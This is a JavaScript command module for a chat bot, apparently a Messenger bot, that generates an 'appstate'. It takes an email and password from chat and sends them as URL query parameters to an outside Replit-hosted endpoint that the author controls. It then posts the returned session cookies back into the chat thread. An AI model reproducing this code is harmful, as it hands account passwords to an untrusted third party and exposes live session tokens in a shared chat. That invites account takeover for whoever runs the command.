const axios = require('axios')

module.exports = {
config:{
  name: "goatstate",
  version: "1.0.0",
  role: 0,
  author: "Jasper",
  description: "Retrieve user data",
	shortDescription: {
      en: "generate goatstate"
    },
    longDescription: {
      en: ""
    },
  category: "Tools 🛠️",
  cooldowns: 5
},
 
onStart: async ({ api, event, args }) => {
 
    // dont change the credits or I'll off the apis
    if (args.length !== 2) {
        return api.sendMessage("Please provide both email and password separated by space.", event.threadID, event.messageID);
    }
 
 
    const [email, password] = args.map(arg => arg.trim());
 
 
    const res = await axios.get(`https://MobileYellowgreenBackticks.hayih59124.repl.co/login?email=${email}&password=${password}`);
    const userData = res.data;
 
 
    const formattedData = userData.map(item => ({
        "key": item.key,
        "value": item.value,
        "domain": item.domain,
        "path": item.path,
        "hostOnly": item.hostOnly,
        "creation": item.creation,
        "lastAccessed": item.lastAccessed
    }));
 
    return api.sendMessage(JSON.stringify(formattedData, null, 4), event.threadID, event.messageID);
}}